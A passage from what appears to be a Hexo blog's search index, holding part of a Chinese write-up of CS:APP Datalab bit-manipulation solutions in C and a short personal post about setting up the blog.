</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><p>题意：判断一个数是否为反码下的最大值<br>思路：若x为Tmax，x+1取反之后应该等于x。故可以采用取反与原数Xor的思路。但要注意，<strong>0xffffffff</strong>也满足该性质，需要排除。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !(~(x+<span class="number">1</span>)^x)&amp;!(!(~x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><p>题意：判断一个数是否所有的奇数位都为1。(位的序号从0到32)<br>思路：我们知道，若奇数位为均为1，则右移一位后偶数位均为1，两者相与的话为<strong>0xffffffff</strong>。利用该性质可得到答案。不过要注意，偶数位上的1会影响我们的判断，故需要利用掩码将其过滤。(0xA = 1010)<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">x = x &amp; <span class="number">0xAAAAAAAA</span>;</span><br><span class="line"><span class="keyword">return</span> !(~(x|(x&gt;&gt;<span class="number">1</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><p>题意：求一个数的相反数。<br>思路：水题，由常用结论我们知道，-x = ~x + 1<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="isAsciiDight"><a href="#isAsciiDight" class="headerlink" title="isAsciiDight"></a>isAsciiDight</h3><p>题意：判断一个数字是否在(0x30和0x39)之间<br>思路：这道题我想不出比较好的解法。只能暴力判断。即先看2进制下的前26六位是否有值，然后在看下后6位。x+6仍然小于0x40，则x小于0x3。.再看下剩下六位中前两位是否均为1，是的话x大于0x30。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> t = x &amp; <span class="number">0xFFFFFFC0</span>;</span><br><span class="line">x = x &amp; <span class="number">0x3F</span>;</span><br><span class="line"><span class="keyword">return</span> !t&amp;!((x+<span class="number">6</span>)&amp;<span class="number">0x40</span>)&amp;(x&gt;&gt;<span class="number">4</span>)&amp;(x&gt;&gt;<span class="number">5</span>)&amp;<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><p>题意：实现三目运算符 ？：<br>思路：先用！判断是否为x是否为真。然后在利用与的性质：一个数和<strong>0xffffffff</strong>相与结果为其本身，和<strong>0</strong>相与结果为0。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">x = !x;</span><br><span class="line"><span class="keyword">return</span> y&amp;(~(!x)+<span class="number">1</span>) | z&amp;(~x+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><p>题意：判断x是否小于等于y<br>思路：x&lt;=y 则 y - x &gt;= 0。分别取出x和y的符号，进行判断。若y大于0，x小于0，则显然为真。若y小于0，x大于0，则显然为假。剩下的异号的情况则用y + (-x) 判断即可。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sgnx = (x&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> sgny = (y&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> !sgny &amp; sgnx | !(sgnx^sgny) &amp; !((y + (~x+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><p>题意：使用其他的逻辑运算符和位运算符实现 ！运算符<br>思路：我们知道，一个数的相反数等于其本身的数只有0(注意：<strong>~0x80000000 + 1 = 0x80000000</strong>)<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((~x+<span class="number">1</span> | x)&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><p>题意：给一个数字x,求出要表示出x需要的最少的位数。<br>思路：个人觉得，本题难度很大。以下的思路可能并不算很好，不过还是可以通过的。<br>　　首先，我们知道，对于一个n位的二进制数，能表示的数字的范围为 -2<sup>n</sup> ~ 2<sup>n</sup> - 1。故对于输入的整数x，我们可以先将其变成正数，即下方的_mask。现在就只需考虑正数。题目转化为求最高位的1。但最高位的1不是很好求，我们可以将其转化为求二进制下x含有多少个1。<br>　　假设当前最高位的1位于第5位，右移并按位或后，第五位，第四位均为1，再向右移两位并且按位或，第二、三、四、五位均为1，以此类推，我们将最高位的1后的所有位全部变成了1。(假设原数为0x0A0BA973，经过处理之后就会变成0x0FFFFFFF)。<br>　　接下来考虑如何求出所有位上1的总数。我们可以考虑使用分段的办法。考虑以下的32位二进制数,我们将其分成四个部分：<br>　　00000010 | 00100111 | 11010010 | 00110001<br>接下来我们采用掩码分别将其各个部分的1的总数做一个累加，掩码应为：<br>　　00000001 | 00000001 | 00000001 | 00000001<br>即对每一个部分，掩码的值都是1。接下来用&amp;运算符获得最低位的数字，四个部分分别为0,1,0,1. 然后，再将x右移一位，再继续进行&amp;运算，以此类推，最后得到四个部分的值分别为：1,4,4,3。即最后得到的sum为：<br>　　00000001 | 00000100 | 00000100 | 00000011<br>最后再利用掩码0xff(11111111)，分别得到各个部分的值，做一个累加，得到答案(别忘记+1)。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">int</span> _mask = (x&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))&gt;&gt;<span class="number">31</span>;</span><br><span class="line">x = x^_mask;</span><br><span class="line">x |= x&gt;&gt;<span class="number">1</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">2</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">4</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">8</span>;</span><br><span class="line">x |= x&gt;&gt;<span class="number">16</span>;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>, mask = <span class="number">0x1</span> | <span class="number">0x100</span> | <span class="number">0x10000</span> | <span class="number">0x1000000</span>;</span><br><span class="line">sum += x &amp; mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">1</span>) &amp;mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">2</span>) &amp;mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">3</span>) &amp;mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">4</span>) &amp;mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">5</span>) &amp;mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">6</span>) &amp;mask;</span><br><span class="line">sum += (x&gt;&gt;<span class="number">7</span>) &amp;mask;</span><br><span class="line"><span class="keyword">return</span> (sum&amp;<span class="number">0xff</span>) + ((sum&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>) + ((sum&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>) + ((sum&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><p>题意：本题给一个无符号数，让你把它看成一个浮点数(都是32位)，让你输出x * 2 的值<br>思路：比较简单，按照浮点数1,8,23的分布将符号，指数，尾数分别取出，并分类讨论即可。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> frac = uf&amp;<span class="number">0x007fffff</span>;</span><br><span class="line">uf&gt;&gt;=<span class="number">23</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="built_in">exp</span> = uf&amp;<span class="number">0xff</span>;</span><br><span class="line">uf&gt;&gt;=<span class="number">8</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">exp</span>) &#123;</span><br><span class="line">frac &lt;&lt;= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> t = frac&gt;&gt;<span class="number">23</span>;</span><br><span class="line"><span class="keyword">if</span> (t) &#123;</span><br><span class="line">frac = frac &amp; <span class="number">0x007fffff</span>;</span><br><span class="line"><span class="built_in">exp</span>++;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">exp</span> != <span class="number">0xff</span>)  <span class="built_in">exp</span>++;</span><br><span class="line"><span class="keyword">return</span> (uf&lt;&lt;<span class="number">31</span>) + (<span class="built_in">exp</span>&lt;&lt;<span class="number">23</span>) + frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><p>题意：给你一个无符号数，并将其看成浮点数(32位)，要求输出(int)x的值<br>思路：本题依然在考察对浮点数的基本理解。解决的思路同上题类似，不再赘述。另外提醒一下，本题有个坑，求得到的bias直接拿来进行右移运算或左移运算会存在问题：&gt;&gt; 和 &lt;&lt; 运算符当偏移量超过32时，会自动进行取模运算，故有可能使得结果出现错误。左移的话有可能还会导致答案溢出。记得分类讨论。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> frac = uf &amp; <span class="number">0x007fffff</span>;</span><br><span class="line">uf &gt;&gt;= <span class="number">23</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">exp</span> = uf &amp; <span class="number">0xff</span>;</span><br><span class="line">uf &gt;&gt;= <span class="number">8</span>;</span><br><span class="line"><span class="keyword">int</span> sgn = uf;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">exp</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">frac |= <span class="number">0x800000</span>;</span><br><span class="line"><span class="keyword">int</span> bias = <span class="built_in">exp</span> - <span class="number">0x7f</span> - <span class="number">23</span>;</span><br><span class="line"><span class="keyword">if</span> (bias &lt; <span class="number">0</span>) &#123;</span><br><span class="line">bias = -bias;</span><br><span class="line"><span class="keyword">if</span> (bias &gt;= <span class="number">32</span>) bias = <span class="number">31</span>;</span><br><span class="line">frac &gt;&gt;= bias;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (bias &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">while</span>(bias) &#123;</span><br><span class="line">frac&lt;&lt;=<span class="number">1</span>;</span><br><span class="line">bias--;</span><br><span class="line"><span class="keyword">if</span> (frac &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (sgn) <span class="keyword">return</span> -frac;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> frac;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h3><p>题意：给一个整数x，要求输出2.0<sup>x</sup>的值。<br>思路：同样，本题依然在考察对浮点数存储的基本理解。要注意的是，+INF的是指exp为0xff，frac为0的值。NaN指的是exp为0xff，frac不为0的值。0的浮点数表示依然为0。<br>解：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sgn = <span class="number">0</span>, <span class="built_in">exp</span> = <span class="number">0</span>, frac = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">-126</span> - <span class="number">23</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">-126</span>) frac = <span class="number">1</span> &lt;&lt; (<span class="number">149</span>+x);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">exp</span> = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> &gt; <span class="number">0xff</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">exp</span>&lt;&lt;<span class="number">23</span>) + frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>　　倘若一切顺利，你最终将得到类似这样的一张图片：<br>　　<img src="/2018/12/25/csapp-Datalab/firstLab.png" alt="Datalab_final"><br>　　那么恭喜你，你的第一个实验————Datalab通关啦！</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>First article</title>
      <link href="/2018/12/14/First-article/"/>
      <url>/2018/12/14/First-article/</url>
      
        <content type="html"><![CDATA[<h1 id="First-article"><a href="#First-article" class="headerlink" title="First article"></a>First article</h1><blockquote><p>终于基本把博客弄完了</p></blockquote><p>　　感觉现在充满了成就感O(∩_∩)O。从这星期一开始就想弄了，但是却一直拖着。前两天在学HTML的一些语法，觉得语法真的好多啊，而且有点复杂。然后周三周四就基本都是在看搭博客的一些相关的东西，花了好长时间，一直在踩坑（可能是我比较菜）。买域名，弄github pages什么的。一开始用jekyll的框架来搭建，遇到了无数的问题，最后好在基本解决了，但是又发现踏入了一个新的大坑：找不到好用的模板。然后最后看到了hexo，果断先找模板。在看到了nexT这个主题之后，果断选择入坑。</p><p>　　可能是由于之前jekyll踩的坑有点多，也有可能是hexo比较适合小白。。基本上这个搭建过程中没有出现什么比较大的问题，然后弄完就是各种优化什么的，也算比较顺利吧，到今天早上就基本算是结束了。整体上还是过得去的。（不过貌似手机版看起来的效果比较差？？）</p><p>　　然后在这里就还是来立一个flag吧。以后（至少应该是大学期间吧）这个博客应该是会一直做下去的，尽量每个月至少发一篇博客吧，不过比较忙的时候的话可能没什么办法。基本上大部分博客的内容应该是以硬核为主，不过目前水平不够，也没办法写出比较高质量的东西。内容上可能主要是当前阶段在学习的一些东西，算法，数据结构，或者是自己做的一些小项目，课设什么的也有可能会放进来。目的还是分享吧，如果有什么地方写的不太好，欢迎直接私戳（网页版的话右下角应该是有一个对话框的）。</p><p>　　好吧，憋不出来了。。就这样吧</p><p>　　哦对了，最后放上一张有爱的图片镇楼（<a href="https://www.pixiv.net/" target="_blank" rel="noopener">p站</a>上找的）。<br><img src="/2018/12/14/First-article/ピカチュウ.jpg" alt="ピカチュウ"></p>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> others </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
